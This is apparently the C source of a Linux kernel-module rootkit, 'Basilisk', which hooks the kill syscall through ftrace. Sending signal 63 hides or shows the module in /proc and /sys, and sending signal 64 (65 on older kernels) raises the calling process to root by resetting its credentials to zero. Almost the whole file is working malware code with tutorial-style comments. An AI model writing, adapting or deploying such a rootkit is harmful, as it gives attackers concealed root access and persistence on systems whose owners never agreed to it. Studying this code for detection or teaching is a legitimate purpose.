#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>

#include "ftrace_helper_new.h"
#include "stealth_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Skelly");
MODULE_DESCRIPTION("Basilisk LKM Rootkit");
MODULE_VERSION("0.02");

#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

static short hidden = 0;
/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* After grabbing the sig out of the pt_regs struct, just check
 * for signal 64 (unused normally) and, using "hidden" as a toggle
 * we either call hideme(), showme() or the real sys_kill()
 * syscall with the arguments passed via pt_regs. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{ 
    void set_root(void);
    void show_basilisk(void);
    void hide_basilisk(void);
    // pid_t pid = regs->di;
    int sig = regs->si;

    switch (sig) {
	case 63:
	    if (hidden) 
	    {
	        printk(KERN_INFO "basilisk: showing kernel module...\n");
		show_basilisk();
	    } else 
	    {
	        printk(KERN_INFO "basilisk: hiding kernel module...\n");
		hide_basilisk();
	    };
	    break;
	case 64:
	    printk(KERN_INFO "basilisk: giving root...\n");
	    set_root();
	    break;
        default:
	    return orig_kill(regs);
    }
    return 0;
}

#else
/* This is the old way of declaring a syscall hook */
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);
    void show_basilisk(void);
    void hide_basilisk(void);
    
    switch (sig) {
	case 63:
	    if (hidden) 
	    {
	        printk(KERN_INFO "basilisk: showing kernel module...\n");
		show_basilisk();
	    } else 
	    {
	        printk(KERN_INFO "basilisk: hiding kernel module...\n");
		hide_basilisk();
	    };
	    break;
	
	case 65:
	    printk(KERN_INFO "basilisk: giving root...\n");
	    set_root();
	    break;
        default:
	    return orig_kill(pid, sig);

    }
    return 0;
}
#endif

/* Add this LKM back to the loaded module list, at the point
 * specified by prev_module */

/* Record where we are in the loaded module list by storing
 * the module prior to us in prev_module, then remove ourselves
 * from the list */

void hide_basilisk(void)
{
    proc_hide();
    sys_hide();
    hidden = 1;
}
void show_basilisk(void)
{
    proc_show();
    sys_show();
    hidden = 0;
}

void set_root(void)
{
	struct cred *root;
	root = prepare_creds();

	if (root == NULL)
		return;

	// Set credentials to root
	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
}
/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("sys_kill", hook_kill, &orig_kill),
};

/* Module initialization function */
static int __init basilisk_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "basilisk: loaded\n");

    return 0;
}

static void __exit basilisk_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "basilisk: unloaded\n");
}

module_init(basilisk_init);
module_exit(basilisk_exit);
